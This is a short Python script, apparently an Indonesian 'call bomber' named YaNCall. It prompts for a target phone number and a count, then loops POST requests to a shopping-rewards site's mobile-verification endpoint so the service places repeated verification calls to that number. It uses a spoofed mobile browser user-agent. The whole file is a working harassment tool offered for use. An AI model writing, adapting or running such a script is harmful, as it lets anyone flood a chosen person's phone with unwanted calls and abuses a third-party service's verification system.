import os,sys,time,requests
from time import sleep

os.system("clear")
os.system("figlet YaNCall")
yan= """
=========================================================
| Pembuat: YaN                                          |
========================================================= """
print(yan)
no= input("No Target: ")
jumlah= int(input("Berapa Call: "))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
  send = requests.post(url+no, headers=ua, data=dat)
  print(" Status = ",(send.json()["message"]))